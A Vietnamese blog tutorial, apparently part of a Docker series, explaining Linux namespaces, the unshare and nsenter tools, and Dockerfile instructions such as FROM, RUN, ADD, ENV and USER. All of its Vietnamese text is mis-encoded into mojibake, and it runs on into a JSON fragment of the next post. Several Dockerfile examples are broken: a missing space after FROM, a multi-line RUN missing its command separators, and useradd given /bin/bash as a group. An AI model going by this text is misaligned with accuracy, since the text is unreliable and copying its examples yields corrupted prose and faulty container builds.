Kh√°i ni·ªám: Namespace - kh√¥ng gian t√™n:\n  L√† m·ªôt trong nh·ªØng th√†nh ph·∫ßn c∆° b·∫£n c·ªßa container.\n  gi·ªõi h·∫°n nh·ªØng g√¨ c√°c process c√≥ th·ªÉ th·∫•y v√† truy c·∫≠p tr√™n h·ªá th·ªëng.\n  ƒë·ªãnh nghƒ©a v·ªã tr√≠ inode tr√™n ƒëƒ©a.\ninode l√† m·ªôt c·∫•u tr√∫c d·ªØ li·ªáu trong m·ªôt h·ªá th·ªëng t·∫≠p tin Unix - phong c√°ch m√¥ t·∫£ c·ªßa m·ªôt t·∫≠p tin h·ªá th·ªëng ƒë·ªëi t∆∞·ª£ng nh∆∞ m·ªôt t·∫≠p tin ho·∫∑c m·ªôt th∆∞ m·ª•c. S·ªë l∆∞·ª£ng n√∫t trong t√†i kho·∫£n b·∫±ng v·ªõi s·ªë l∆∞·ª£ng t·ªáp v√† th∆∞ m·ª•c c√≥ tr√™n ƒë√≥. Hay c√≥ th·ªÉ hi·ªÉu, inodes = s·ªë files + folder.\n  Th√¥ng qua m·ªôt namespace, nhi·ªÅu process kh√°c nhau c√≥ th·ªÉ chia s·∫ª, giao ti·∫øp v·ªõi nhau.\n  Khi m·ªôt container b·∫Øt ƒë·∫ßu ch·∫°y, n√≥ s·∫Ω t·∫°o ra m·ªôt namespace m·ªõi cho ƒë·ªÉ c√°c process ch·∫°y trong h·ªôp c√°t (sandboxes) ch·∫°y. B·∫±ng c√°ch ph√¢n b·ªï namespace d·ª±a tr√™n c√°c pid, t·∫°i th·ªùi ƒëi·ªÉm ch·∫°y, m·ªôt process s·∫Ω truy c·∫≠p v√†o namespace t∆∞∆°ng ·ª©ng v·ªõi pid c·ªßa m√¨nh, vi·ªác n√†y gi√∫p cho process c√≥ c·∫£m gi√°c ch·ªâ m·ªôt m√¨nh n√≥ ch·∫°y tr√™n h·ªá th·ªëng.\n  M·ªôt s·ªë lo·∫°i bi·∫øn th·ªÉ c·ªßa namespace Trong namespace ƒë·ªãnh nghƒ©a m·ªôt s·ªë bi·∫øn th·ªÉ:\nMount (mnt): mount namespace ƒëi·ªÅu khi·ªÉn c√°c mount point. Khi t·∫°o, c√°c li√™n k·∫øt t·ª´ mount namespace hi·ªán t·∫°i ƒë∆∞·ª£c sao ch√©p sang kh√¥ng gian t√™n m·ªõi, nh∆∞ng c√°c mount point ƒë∆∞·ª£c t·∫°o sau ƒë√≥ kh√¥ng truy·ªÅn gi·ªØa mount namespace. C·ªù sao ch√©p ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ t·∫°o kh√¥ng gian t√™n m·ªõi thu·ªôc lo·∫°i n√†y l√† CLONE_NEWNS - vi·∫øt t·∫Øt c·ªßa \u0026ldquo;NEW NameSpace\u0026rdquo;. Thu·∫≠t ng·ªØ n√†y kh√¥ng mang t√≠nh m√¥ t·∫£ (v√¨ n√≥ kh√¥ng cho bi·∫øt lo·∫°i kh√¥ng gian t√™n n√†o s·∫Ω ƒë∆∞·ª£c t·∫°o) b·ªüi v√¨ mount namespaces l√† lo·∫°i namespace ƒë·∫ßu ti√™n v√† t·∫°i th·ªùi ƒëi·ªÉm, c√°c nh√† thi·∫øt k·∫ø kh√¥ng l∆∞·ªùng tr∆∞·ªõc ƒë∆∞·ª£c s·∫Ω c√≥ b·∫•t k·ª≥ lo·∫°i namespaces n√†o kh√°c.\nProcess ID(pid): PID namespaces cung c·∫•p nh·ªØng process v·ªõi t·∫≠p pid ƒë·ªôc l·∫≠p v·ªõi nh·ªØng namespace kh√°c. C√°c PID namespace c√≥ th·ªÉ l·ªìng v√†o nhau nghƒ©a l√†: m·ªói process ƒë∆∞·ª£c t·∫°o trong m·ªôt namespace s·∫Ω c√≥ 1 pid, v√† pid n√†y s·∫Ω ƒë∆∞·ª£c th·∫•y b·ªüi c√°c process ·ªü trong namespace hi·ªán t·∫°i ra cho ƒë·∫øn namespace ƒë·∫ßu ti√™n. Nghe c√≥ v·∫ª gi·ªëng nh∆∞ trong c√¥ng ty, m·ªôt nh√¢n vi√™n m·ªõi v√†o s·∫Ω c√≥ m·ªôt th√¥ng tin v√† ƒë·ªãnh danh ri√™ng, nh·ªØng th√¥ng tin n√†y s·∫Ω ƒë∆∞·ª£c bi·∫øt b·ªüi s·∫øp anh ta, s·∫øp c·ªßa s·∫øp, s·∫øp c·ªßa s·∫øp c·ªßa s·∫øp ü§£ü§£ü§£.\nProcess ƒë·∫ßu ti√™n s·∫Ω ƒë∆∞·ª£c g√°n PID l√† 1, n√≥ c√≥ v·ªã tr√≠ gi·ªëng nh∆∞ ch·ªß tich h·ªôi ƒë·ªìng qu·∫£n tr·ªã c·ªßa c√¥ng ty, t·ª´ tr√™n nh√¨n xu·ªëng c√≥ th·ªÉ th·∫•y t·∫•t c·∫£ nh·ªØng process kh√°c, v√† c√≥ quy·ªÅn \u0026ldquo;ƒëu·ªïi\u0026rdquo; t·∫•t c·∫£ nh·ªØng process d∆∞·ªõi tr∆∞·ªõng c·ªßa m√¨nh.\nUser ID (user): User namespace l√† m·ªôt t√≠nh nƒÉng ƒë·ªÉ cung c·∫•p kh·∫£ nƒÉng ph√¢n quy·ªÅn v√† ph√¢n nh√≥m ng∆∞·ªùi d√πng tr√™n nhi·ªÅu process, kh·∫£ n·∫±ng ƒë√£ s·∫µn c√≥ t·ª´ kernel 3.8. V·ªõi quy·ªÅn admin, c√≥ th·ªÉ x√¢y d·ª±ng m·ªôt container c√≥ v·∫ª nh∆∞ c√≥ quy·ªÅn admin nh∆∞ng kh√¥ng th·ª±c s·ª± c·∫•p c√°c ƒë·∫∑c quy·ªÅn n√¢ng cao cho c√°c process c·ªßa ng∆∞·ªùi d√πng. Gi·ªëng nh∆∞ PID namespace, user namespace d√πng ƒë∆∞·ª£c l·ªìng v√†o nhau v√† m·ªói user namespace m·ªõi ƒë∆∞·ª£c coi l√† con c·ªßa user namespace ƒë√£ t·∫°o ra n√≥.\nUser namespace ch·ª©a m·ªôt b·∫£ng √°nh x·∫° ƒë·ªÉ chuy·ªÉn ƒë·ªïi c√°c user ID t·ª´ container sang h·ªá th·ªëng. ƒêi·ªÅu n√†y cho ph√©p, v√≠ d·ª•, ng∆∞·ªùi d√πng root c√≥ user id 0 trong container nh∆∞ng th·ª±c s·ª± ƒë∆∞·ª£c h·ªá th·ªëng coi l√† user id 1.400.000 ƒë·ªÉ ki·ªÉm tra quy·ªÅn s·ªü h·ªØu. M·ªôt b·∫£ng t∆∞∆°ng t·ª± ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ √°nh x·∫° group id v√† ki·ªÉm tra quy·ªÅn s·ªü h·ªØu.\nƒê·ªÉ t·∫°o ƒëi·ªÅu ki·ªán thu·∫≠n l·ª£i cho vi·ªác c√¥ l·∫≠p ƒë·∫∑c quy·ªÅn c·ªßa c√°c h√†nh ƒë·ªông admin, m·ªói lo·∫°i namespace ƒë∆∞·ª£c coi l√† thu·ªôc s·ªü h·ªØu c·ªßa m·ªôt user namespace d·ª±a tr√™n user namespace ƒëang ho·∫°t ƒë·ªông t·∫°i th·ªùi ƒëi·ªÉm t·∫°o. Ng∆∞·ªùi d√πng quy·ªÅn admin trong user namespace th√≠ch h·ª£p s·∫Ω ƒë∆∞·ª£c ph√©p th·ª±c hi·ªán c√°c h√†nh ƒë·ªông admin trong lo·∫°i namespace ƒë√≥. V√≠ d·ª•: n·∫øu m·ªôt process c√≥ quy·ªÅn qu·∫£n tr·ªã ƒë·ªÉ thay ƒë·ªïi ƒë·ªãa ch·ªâ IP c·ªßa giao di·ªán m·∫°ng, n√≥ c√≥ th·ªÉ l√†m nh∆∞ v·∫≠y mi·ªÖn l√† user namespace c·ªßa ch√≠nh n√≥ gi·ªëng v·ªõi (ho·∫∑c t·ªï ti√™n c·ªßa) user namespace s·ªü h·ªØu network namespace. Do ƒë√≥ user namespace ban ƒë·∫ßu c√≥ quy·ªÅn ki·ªÉm so√°t qu·∫£n tr·ªã ƒë·ªëi v·ªõi t·∫•t c·∫£ c√°c lo·∫°i user namespace trong h·ªá th·ªëng.\nNetwork (net): Network namespace ·∫£o h√≥a network stack. Khi ƒë∆∞·ª£c t·∫°o, network namespace ch·ªâ ch·ª©a m·ªôt loopback interface. M·ªói network interface (l√† physical hay virtual) th·ªÉ hi·ªán ch√≠nh x√°c m·ªôt namespace v√† c√≥ th·ªÉ di chuy·ªÉn gi·ªØa c√°c namespace v·ªõi nhau.\nM·ªôt namespace s·∫Ω c√≥ t·∫≠p c√°c ƒë·ªãa ch·ªâ IP ri√™ng, ch·ª©a nh·ªØng routing table, socket listing, connection tracking table, firewall, v√† nh·ªØng resources li√™n quan t·ªõi network kh√°c.\nKhi h·ªßy m·ªôt kh√¥ng gian t√™n m·∫°ng s·∫Ω ph√° h·ªßy b·∫•t k·ª≥ giao di·ªán ·∫£o n√†o b√™n trong n√≥ v√† di chuy·ªÉn b·∫•t k·ª≥ giao di·ªán v·∫≠t l√Ω n√†o b√™n trong n√≥ tr·ªü l·∫°i kh√¥ng gian t√™n m·∫°ng ban ƒë·∫ßu.\nInterprocess Communication (ipc): ipc namespace d√πng ƒë·ªÉ c√¥ l·∫≠p c√°c process trong giao ti·∫øp. ƒêi·ªÅu n√†y ngƒÉn kh√¥ng cho c√°c qu√° tr√¨nh trong c√°c v√πng t√™n IPC kh√°c nhau s·ª≠ d·ª•ng, ch·∫≥ng h·∫°n nh∆∞ nh√≥m h√†m SHM ƒë·ªÉ thi·∫øt l·∫≠p ph·∫°m vi b·ªô nh·ªõ d√πng chung gi·ªØa hai qu√° tr√¨nh. Thay v√†o ƒë√≥, m·ªói qu√° tr√¨nh s·∫Ω c√≥ th·ªÉ s·ª≠ d·ª•ng c√πng m·ªôt s·ªë nh·∫≠n d·∫°ng cho m·ªôt v√πng b·ªô nh·ªõ d√πng chung v√† t·∫°o ra hai v√πng ri√™ng bi·ªát nh∆∞ v·∫≠y.\nUTS: UTS namespace (UNIX Time-Sharing) cho ph√©p m·ªôt h·ªá th·ªëng duy nh·∫•t c√≥ v·∫ª nh∆∞ c√≥ c√°c t√™n mi·ªÅn v√† m√°y ch·ªß l∆∞u tr·ªØ kh√°c nhau cho c√°c qu√° tr√¨nh kh√°c nhau. \u0026ldquo;Khi m·ªôt quy tr√¨nh t·∫°o m·ªôt v√πng t√™n UTS m·ªõi \u0026hellip; t√™n m√°y ch·ªß v√† mi·ªÅn c·ªßa v√πng t√™n UTS m·ªõi ƒë∆∞·ª£c sao ch√©p t·ª´ c√°c gi√° tr·ªã t∆∞∆°ng ·ª©ng trong v√πng t√™n UTS c·ªßa ng∆∞·ªùi g·ªçi\u0026rdquo;.\n C√≤n nhi·ªÅu lo·∫°i bi·∫øn th·ªÉ kh√°c, ch√∫ng ta c√≥ th·ªÉ xem ch√∫ng t·∫°i ƒë√¢y.  Unshare tool  l√† c√¥ng c·ª• gi√∫p ch√∫ng ta c√≥ th·ªÉ ch·∫°y m·ªôt process v√† y√™u c·∫ßu n√≥ t·∫°o ra m·ªôt namespace m·ªõi.  1 2 3 4 5 6 7  $ sudo unshare --fork --pid --mount-proc bash\r$ ps\rPID TTY TIME CMD\r1 pts/0 00:00:00 bash\r9 pts/0 00:00:00 ps\r$ exit\rexit\r  What happens when we share a namespace? Ch√∫ng ta c√≥ th·ªÉ li·ªát k√™ t·∫•t c·∫£ nh·ªØng namespace b·∫±ng l·ªánh:\n1  ls -lha /proc/$DBPID/ns/   M·ªôt c√¥ng c·ª• kh√°c ch√∫ng ta c√≥ th·ªÉ d√πng ƒë√≥ l√† nsenter d√πng ƒë·ªÉ g√°n m·ªôt process v√†o m·ªôt kh√¥ng gian t√™n ƒë√£ t·ªìn t·∫°i, c√¥ng c·ª• n√†y s·∫Ω h·ªØu d·ª•ng khi debug.\n1  nsenter --target $DBPID --mount --uts --ipc --net --pid ps aux\r  Container images Container images ch√∫ng ta ƒë√£ ƒë∆∞·ª£c h·ªçc kƒ© trong c√°c b√†i tr∆∞·ªõc, ·ªü ƒë√¢y c√≥ m·ªôt s·ªë ch√∫ √Ω nh·ªè nh·ªè:\n Nh·ªØng images ch·ª©a d·ªØ li·ªáu th√¥ (metadata) ƒë·ªÉ l√†m c∆° s·ªü ƒë·ªÉ x√¢y d·ª±ng nh·ªØng image kh√°c. Ch√∫ng ta ƒë√£ bi·∫øt, images s·∫Ω c√≥ nhi·ªÅu layer, c√≥ 1 layer g·ªëc v√† nh·ªØng layer sau l√† qu√° tr√¨nh ch√∫ng ta c√†i ƒë·∫∑t, thi·∫øt l√¢p th√™m m√¥i tr∆∞·ªùng khi ch·∫°y contaier ƒë∆∞·ª£c sinh ra t·ª´ image ban ƒë·∫ßu. ·ªû ƒë√¢y, m·ªói tar file ƒë∆∞·ª£c xem nh∆∞ m·ªôt layer, v√† t·∫•t c·∫£ c√°c tar file ƒë∆∞·ª£c gi·∫£i n√©n t·ªõi c√πng m√¥t v·ªã tr√≠ th√¨  Learn Docker Foundation Deploying First Docker Container Ph·∫ßn n√†y ch√∫ng ta c≈©ng ƒë√£ tr√¨nh b√†y kƒ© ·ªü nh·ªØng ph·∫ßn tr∆∞·ªõc, theo s∆° ƒë·ªì, ta c√≥ th·ªÉ th·∫•y, ƒë·ªÉ build m·ªôt docker container, ch√∫ng ta c√≥ 5 b∆∞·ªõc ch√≠nh:\n Step1: T√¨m ki·∫øm image th√≠ch h·ª£p th√¥ng qua l·ªánh docker search, t·∫£i v·ªÅ b·∫±ng docker pull v√† ch·∫°y b·∫±ng docker run Step2: Ki·ªÉm tra nh·ªØng container ƒëang ch·∫°y:  docker ps: li·ªát k√™ t·∫•t c·∫£ c√°c container ƒëang ch·∫°y v√† c√°c th√¥ng tin v·ªÅ n√≥ docker inspect: cung c·∫•p th√¥ng tin chi ti·∫øt v·ªÅ m·ªôt container ƒëang ch·∫°y. docker logs: nh·ªØng message m√† container ƒë√£ log khi ch·∫°y.   Step3: Truy c·∫≠p v√†o container ƒëang ch·∫°y. ·ªû ƒë√¢y, ƒë·ªëi v·ªõi m·ªôt container ƒëang ch·∫°y ƒë·ªÉ l·∫•y port c·ªßa n√≥ ta c√≥ th·ªÉ d√πng m·ªôt trong 2 l·ªánh:  1 2  docker ps\rdocker port container_id port_number\r   Step 4: Thi·∫øt l·∫≠p chia s·∫ª d·ªØ li·ªáu gi·ªØa container v√† host c≈©ng nh∆∞ c√°c container v·ªõi nhau, ƒë·∫£m b·∫£o d·ªØ li·ªáu c·∫ßn thi·∫øt s·∫Ω ƒë∆∞·ª£c l∆∞u khi container b·ªã x√≥a. Step 5: Ch·∫°y container, ·ªü ƒë√¢y c√≥ m·ªôt s·ªë thi·∫øt l·∫≠p nh∆∞ -d ƒë·ªÉ ch·∫°y n·ªÅn hay -it ƒë·ªÉ t∆∞∆°ng t√°c v·ªõi shell.\nNh·ªØng ph·∫ßn n√†y ch√∫ng ta ƒë√£ ƒë∆∞·ª£c h·ªçc ·ªü nh·ªØng b√†i tr∆∞·ªõc.  Deploy Static HTML Website as Container T√≥m t·∫Øt cho ph·∫ßn n√†y\nCreate Dockerfile Docker file l√† g√¨? Dockerfile l√† m·ªôt d·∫°ng file text, kh√¥ng c√≥ ph·∫ßn ƒëu√¥i m·ªü r·ªông, ch·ª©a t·∫≠p c√°c l·ªánh m√¥ t·∫£ c√°c b∆∞·ªõc ƒë·ªÉ build m·ªôt docker image.\nC√∫ ph√°p c·ªßa m·ªôt dockerfile. C·∫•u tr√∫c chung c·ªßa m·ªôt dockerfile c√≥ d·∫°ng\nINSTRUCTION arguments\rTrong ƒë√≥:\n INSTRUCTION: l√† t√™n c√°c ch·ªâ th·ªã c√≥ trong Dockerfile, m·ªói ch·ªâ th·ªã th·ª±c hi·ªán m·ªôt nhi·ªám v·ª• nh·∫•t ƒë·ªãnh, do dockerfile quy ƒë·ªãnh. M·∫∑c ƒë·ªãnh, l·ªánh n√†y ph·∫£i ƒë∆∞·ª£c vi·∫øt b·∫±ng ch·ªØ IN HOA arguments: n·ªôi dung m√† l·ªánh th·ª±c hi·ªán\nV√≠ d·ª•:  1 2  FROMnginx:alpine\rCOPY . /usr/share/nginx/html\r  D√≤ng l·ªánh 1 ƒë·ªÉ ƒë·ªãnh nghƒ©a base images v√† d√≤ng l·ªánh 2 ƒë·ªÉ ch·ªâ th·ªã copy t·∫•t c·∫£ n·ªôi d·ª•ng t·∫°i v·ªã tr√≠ hi·ªán t·∫°i v√†o m·ªôt ƒë·ªãa ch·ªâ c·ª• th·ªÉ tr√™n container, ·ªü ƒë√¢y l√† /usr/share/nginx/html.\nC√°c ch·ªâ th·ªã ch√≠nh trong dockerfile  FROM\nCh·ªâ ƒë·ªãnh r·∫±ng image n√†o s·∫Ω ƒë∆∞·ª£c l√†m c∆° s·ªü trong qu√° tr√¨nh build image ƒë·ªÉ th·ª±c thi nh·ªØng c√¢u l·ªánh ti·∫øp theo. C√°c image n√†y ƒë∆∞·ª£c t·∫£i v·ªÅ t·ª´ Public Repository ho·∫∑c Private Reppository ri√™ng c·ªßa m·ªói ng∆∞·ªùi.\nCh·ªâ th·ªã FROM l√† b·∫Øt bu·ªôc v√† ph·∫£i ƒë∆∞·ª£c ƒë·∫∑t tr√™n c√πng c·ªßa Dockerfile\nC√∫ ph√°p:  1 2 3  FROM \u0026lt;image\u0026gt; [AS \u0026lt;name\u0026gt;] FROM \u0026lt;image\u0026gt;[:\u0026lt;tag\u0026gt;] [AS \u0026lt;name\u0026gt;]\rFROM \u0026lt;image\u0026gt;[@\u0026lt;digest\u0026gt;] [AS \u0026lt;name\u0026gt;]   V√≠ d·ª•:\n1 2 3  FROM ubuntu ho·∫∑c FROM ubuntu:latest\r  LABEL\nCh·ªâ th·ªã LABEL ƒë∆∞·ª£c d√πng ƒë·ªÉ th√™m c√°c th√¥ng tin meta v√†o Docker Image khi ch√∫ng ƒë∆∞·ª£c build. Ch√∫ng t·ªìn t·∫°i d∆∞·ªõi d·∫°ng c·∫∑p key-value, l∆∞u d∆∞·ªõi d·∫°ng chu·ªói. C√≥ th·ªÉ ch·ªâ ƒë·ªãnh nhi·ªÅu label cho m·ªôt Docker Image, m·ªói c·∫∑p key-value l√† duy nh·∫•t.\nN·∫øu c√πng 1 key m√† c√≥ nhi·ªÅu value th√¨ value g·∫ßn nh·∫•t s·∫Ω ƒë√® nh·ªØng value tr∆∞·ªõc ƒë√≥.  C√∫ ph√°p:\n1  LABEL \u0026lt;key1\u0026gt;\u0026lt;value1\u0026gt; \u0026lt;key2\u0026gt;\u0026lt;value2\u0026gt; ... \u0026lt;key_n\u0026gt;\u0026lt;value_n\u0026gt;\r  C√≥ th·ªÉ khai b√°o metadata cho Image theo t·ª´ng d√≤ng ch·ªâ th·ªã ho·∫∑c c√≥ th·ªÉ t√°ch ra khai b√°o th√†nh t·ª´ng d√≤ng ri√™ng bi·ªát.\nƒê·ªÉ xem th√¥ng tin meta c·ªßa m·ªôt image, ta d√πng l·ªánh docker inspect\n1  docker inspect \u0026lt;image id\u0026gt;\r  MAINTAINER\nD√πng ƒë·ªÉ khai b√°o th√¥ng tin t√°c gi·∫£ c·ªßa dockerfile\nC√∫ ph√°p:  1  MAINTAINER \u0026lt;name\u0026gt; [\u0026lt;email\u0026gt;]\r  V√≠ d·ª•:\n1  MAINTAINER \u0026lt;edisc\u0026gt; [\u0026lt;edisc.ctf@gmail.com\u0026gt;]\r  RUN\nD√πng ƒë·ªÉ ch·∫°y m·ªôt l·ªánh n√†o ƒë√≥ trong qu√° tr√¨nh build image, th∆∞·ªùng l√† c√°c c√¢u l·ªánh Linux. T√πy v√†o image g·ªëc ƒë∆∞·ª£c khai b√°o trong FROM th√¨ s·∫Ω c√≥ c√°c c√¢u l·ªánh t∆∞∆°ng ·ª©ng.\nC√∫ ph√°p:  1 2  RUN \u0026lt;command\u0026gt;\rRUN [\u0026#34;executable\u0026#34;, \u0026#34;param1\u0026#34;, \u0026#34;param2\u0026#34;]\r  V√≠ d·ª•\n1 2  RUN apt-get update -y\rRUN [\u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;echo Run\u0026#34;]\r  ·ªû shell form, c√≥ th·ªÉ th·ª±c hi·ªán nhi·ªÅu c√¢u l·ªánh b·∫±ng d·∫•u \\:\n1 2 3 4  FROM ubuntu:latest\rRUN apt-get update -y \\\r apt-get install vim -y\rapt-get install curl -y\r  ADD\nTh·ª±c hi·ªán sao ch√©p c√°c t·ªáp, th∆∞ m·ª•c t·ª´ m√°y ƒëang build ho·∫∑c remote file t·ª´ src v√† th√™m ch√∫ng v√†o filesystem c·ªßa image dest\nC√∫ ph√°p:  1 2  ADD [--chown=\u0026lt;user\u0026gt;:\u0026lt;group\u0026gt;] \u0026lt;src\u0026gt;... \u0026lt;dest\u0026gt;\rADD [--chown=\u0026lt;user\u0026gt;:\u0026lt;group\u0026gt;] [\u0026#34;\u0026lt;src\u0026gt;\u0026#34;, ... \u0026#34;\u0026lt;dest\u0026gt;\u0026#34;]   trong ƒë√≥:\n src c√≥ th·ªÉ l√† m·ªôt ho·∫∑c nhi·ªÅu file, th∆∞ m·ª•c dest l√† ƒë·ªãa ch·ªâ tuy·ªát ƒë·ªëi ho·∫∑c ƒë∆∞·ª£c ch·ªâ ƒë·ªãnh b·ªüi WORKDIR  V√≠ d·ª•:\n1  ADD --chown=user:mygroup file* /somedir/\r  COPY\nGi·ªëng nh∆∞ ADD l√† copy file t·ª´ th∆∞ m·ª•c src ƒë·∫øn dest, kh√°c ·ªü vi·ªác COPY kh√¥ng h·ªó tr·ª£ copy c√°c remote file URLs t·ª´ c√°c ngu·ªìn tr√™n m·∫°ng.\nC√∫ ph√°p:  1 2  COPY [--chown=\u0026lt;user\u0026gt;:\u0026lt;group\u0026gt;] \u0026lt;src\u0026gt;... \u0026lt;dest\u0026gt;\rCOPY [--chown=\u0026lt;user\u0026gt;:\u0026lt;group\u0026gt;] [\u0026#34;\u0026lt;src\u0026gt;\u0026#34;,... \u0026#34;\u0026lt;dest\u0026gt;\u0026#34;]\r  ENV\nD√πng ƒë·ªÉ khai b√°o c√°c bi·∫øn m√¥i tr∆∞·ªùng. C√°c bi·∫øn ƒë∆∞·ª£c khai b√°o d∆∞·ªõi d·∫°ng key-value b·∫±ng c√°c chu·ªói. Ch√∫ng s·∫Ω ƒë∆∞·ª£c s·ª≠ d·ª•ng trong c√°c ch·ªâ th·ªã ti·∫øp theo c·ªßa Dockerfile.\nC√∫ ph√°p:  1  ENV \u0026lt;key\u0026gt;=\u0026lt;value\u0026gt;\r  V√≠ d·ª•:\n1 2  ENV PORT=80\rENV USERNAME=\u0026#34;user\u0026#34; PASSWORD=\u0026#34;password\u0026#34;\r  C√°c bi·∫øn m√¥i tr∆∞·ªùng c√≥ th·ªÉ thay ƒë·ªïi v·ªõi l·ªánh docker run\n1  docker run --env \u0026lt;key\u0026gt;=\u0026lt;value\u0026gt;\r  C√°c command ƒë∆∞·ª£c s·ª≠ d·ª•ng ENV:\n1 2 3 4 5 6 7 8 9 10  ADD\rCOPY\rENV\rEXPOSE\rFROM\rLABEL\rSTOPSIGNAL\rUSER\rVOLUME\rWORKDIR\r  CMD\nD√πng ƒë·ªÉ ƒë·ªãnh nghƒ©a c√°c c√¢u l·ªánh ƒë∆∞·ª£c ch·∫°y sau khi container ƒë∆∞·ª£c kh·ªüi ƒë·ªông t·ª´ image v·ª´a build.\nC√∫ ph√°p:  1 2 3  CMD [\u0026#34;executable\u0026#34;, \u0026#34;param1\u0026#34;, \u0026#34;param2\u0026#34;]\rCMD [\u0026#34;param1\u0026#34;, \u0026#34;param2\u0026#34;]\rCMD command param1 param2\r  V√≠ d·ª•:\n1 2  FROM ubuntu:latest\rCMD cat password.txt   USER\nThi·∫øt l·∫≠p username ho·∫∑c UID ƒë·ªÉ s·ª≠ d·ª•ng khi ch·∫°y image v√† khi ch·∫°y c√°c l·ªánh c√≥ trong RUN, CMD, ENTRYPOINT sau ƒë√≥.\nC√∫ ph√°p:  1 2 3  USER \u0026lt;user\u0026gt;[:\u0026lt;group\u0026gt;]\rho·∫∑c USER \u0026lt;UID\u0026gt;[:\u0026lt;GID\u0026gt;]   V√≠ d·ª•:\n1 2 3  FROM alpine:3.4\rRUN useradd -G /bin/bash edisc\rUSER edisc   Build Docker Image Ta d√πng l·ªánh docker build ƒë·ªÉ ti·∫øn h√†nh build docker image t·ª´ Dockerfile v·ª´a t·∫°o.\nC√∫ ph√°p:\n1  docker build -t \u0026lt;image_name\u0026gt; \u0026lt;build directory\u0026gt;\r  V√≠ d·ª•:\n1  docker build -t myimage:v1 .\r  -t ·ªü ƒë√¢y cho ph√©p ch·ªâ ƒë·ªãnh t√™n image v√† tag c·ªßa n√≥.\nRUN Sau khi ƒë√£ t·∫°o th√†nh image, ta ch·ªâ c·∫ßn run n√≥ v·ªõi l·ªánh docker run ƒë·ªÉ ti·∫øn h√†nh ch·∫°y container.\nT·ªïng k·∫øt Ph·∫ßn n√†y ch√∫ng ta ƒëi qua 2 nh√°nh ch√≠nh l√† What is the container v√† Container images, ·ªü ƒë√≥ ch·ªß y·∫øu l√† nh·ªØng ki·∫øn th·ª©c ch√∫ng ta ƒë√£ th·∫£o lu·∫≠n qua.\nNgo√†i ra, ch√∫ng ta ƒë√£ ƒëi qua m·ªôt v√†i nh√°nh nh·ªè c·ªßa Docker Foundation. V√¨ ph·∫ßn n√†y li√™n quan ƒë·∫øn m·ª•c ƒë√≠ch c√¥ng vi·ªác c·ªßa t√¥i, n√™n t√¥i s·∫Ω h·ªçc kƒ© c≈©ng nh∆∞ t√¨m hi·ªÉu kƒ© ph·∫ßn n√†y. B√†i ti·∫øp theo ch√∫ng ta s·∫Ω c√πng ƒëi qua nh·ªØng nh√°nh k·∫ø ti·∫øp.\n","description":"√în l·∫°i docker v√† chuy·ªÉn n·ªôi dung h·ªçc","id":11,"section":"posts","tags":["Docker"],"title":"T√¨m hi·ªÉu v√† s·ª≠ d·ª•ng docker (P6)","uri":"https://minhlongmt183.github.io/posts/docker_p6/"},{"content":"To√†n b·ªô series n√†y ƒë∆∞·ª£c tham kh·∫£o t·ª´ hai ngu·ªìn ch√≠nh: XuanThuLabChanel v√† DockerDoc. Em xin ch√¢n th√†nh c·∫£m ∆°n s·ª± c·ªëng hi·∫øn c·ªßa c√°c t√°c gi·∫£ c·ªßa nh·ªØng k√™nh n√≥i tr√™n.‚ù§Ô∏è‚ù§Ô∏è‚ù§Ô∏è\r Tra c·ª©u th√¥ng tin Image, Container v√† gi√°m s√°t ho·∫°t ƒë·ªông container Docker C√°c th√†nh ph·∫ßn t·∫°o n√™n Container Ch√∫ng ta ƒë√£ th·∫£o lu·∫≠n v·ªÅ c√°c kh√°i ni·ªám cƒÉn b·∫£n c·ªßa docker ·ªü b·∫£i tr∆∞·ªõc, sau ƒë√¢y l√† nh·ªØng kh√°i ni·ªám tr√™n d∆∞·ªõi g√≥c nh√¨n c·ªßa t√°c gi·∫£.\n Container: l√† m·ªôt h·ªôp k√≠n ƒë·ªÉ ·ª©ng d·ª•ng ho·∫°t ƒë·ªông. M·ªói container ƒë∆∞·ª£c t·∫°o d·ª±a tr√™n m·ªôt image. Khi ch·∫°y m·ªôt container xu·∫•t ph√°t t·ª´ m·ªôt image, c√≥ m·ªôt l·ªõp (layer) ƒë∆∞·ª£c ph√©p ghi th√™m v√†o tr√™n ƒë·ªânh c·ªßa image. Do ƒë√≥ c√≥ th·ªÉ xem: container = images + layer cho ph√©p ghi. V√† khi mu·ªën l∆∞u container n√†y l·∫°i th√†nh image m·ªõi, ta d√πng l·ªánh docker commit. Image: nh∆∞ m·ªôt ·∫£nh ch·ª•p l·∫°i c√°c c·∫•u h√¨nh c·ªßa container. M·ªôt image ·ªü tr·∫°ng th√°i ch·ªâ ƒë·ªçc, m·ªçi th·ª© thay ƒë·ªïi ch·ªâ ƒë∆∞·ª£c thay ƒë·ªïi ·ªü t·∫ßng tr√™n c√πng (ƒë∆∞·ª£c ph√©p ghi) c·ªßa container. Khi d√πng l·ªánh docker commit, t·∫ßng n√†y s·∫Ω tr·ªü th√†nh tr·∫°ng th√°i ch·ªâ ƒë·ªçc. Do ƒë√≥, c√≥ th·ªÉ th·∫•y m·ªói image ƒë·ªÅu ph·ª• thu·ªôc v√†o m·ªôt ho·∫∑c nhi·ªÅu image cha. platform Image: N√≥ l√† image, nh∆∞ng n√≥ kh√¥ng c√≥ image cha, gi·ªëng nh∆∞ b·ªô khung x∆∞∆°ng c·ªßa m·ªôt ch√∫ kh·ªßng long. N√≥ ch·ª©a c√°c bi·∫øn m√¥i tr∆∞·ªùng, c√°c ti·ªán √≠ch ƒë·ªÉ ·ª©ng d·ª•ng ·∫£o h√≥a ch·∫°y. Registry l√† kho ch·ª©a c√°c image, n∆°i chia s·∫ª, t·∫£i v·ªÅ c√°c image. Dockerfile l√† m·ªôt file c·∫•u h√¨nh v·ªõi c·∫•u tr√∫c sinh ra image, n√≥ gi√∫p t·ª± ƒë·ªông h√≥a vi·ªác t·∫°o, ch·∫°y, s·ª≠ d·ª•ng c√°c container.\n·∫¢nh tr√™n cho th·∫•y, docker b·∫Øt ƒë·∫ßu v·ªõi Platform Image ƒë·ªÉ ch·ª©a c√°c bi·∫øn m√¥i tr∆∞·ªùng c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y. Trong qu√° tr√¨nh container th·ª±c thi s·∫Ω ti·∫øn h√†nh c√†i ƒë·∫∑t, b·ªï sung c·∫•u h√¨nh, Layered Images 1, Layered Images 2 l√† images c·ªßa container sau khi th·ª±c hi·ªán l·ªánh docker commit v√† n√≥ ·ªü tr·∫°ng th√°i ch·ªâ 